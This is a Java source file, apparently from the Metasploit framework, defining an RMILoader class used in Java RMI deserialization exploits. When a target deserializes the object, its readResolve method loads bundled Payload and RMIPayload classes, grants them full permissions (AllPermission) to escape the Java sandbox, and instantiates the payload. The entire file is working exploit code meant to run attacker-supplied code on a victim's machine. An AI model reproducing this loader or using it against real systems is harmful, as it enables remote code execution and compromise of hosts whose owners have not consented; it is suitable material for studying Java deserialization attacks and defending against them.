package metasploit;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectStreamException;
import java.io.Serializable;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

public class RMILoader extends ClassLoader implements Serializable {

	public Object readResolve() throws ObjectStreamException {
		try {
			String[] classes = new String[] {
					"metasploit/Payload.class",
					"metasploit/RMIPayload.class"
			};
			Class clazz = null;
			for (int i = 0; i < classes.length; i++) {
				Permissions permissions = new Permissions();
				permissions.add(new AllPermission());
				ByteArrayOutputStream out = new ByteArrayOutputStream();
				InputStream in = getResourceAsStream(classes[i]);
				byte[] buf = new byte[4096];
				int len;
				while ((len = in.read(buf)) != -1) {
					out.write(buf, 0, len);
				}
				in.close();
				byte[] classBytes = out.toByteArray();
				clazz = defineClass(null, classBytes, 0, classBytes.length, new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions));
			}
			clazz.newInstance();
		} catch (Exception ex) {
			throw new RuntimeException(ex.toString());
		}
		return null;
	}
	
	public URL getResource(String name) {
		return getClass().getClassLoader().getResource(name);
	}
}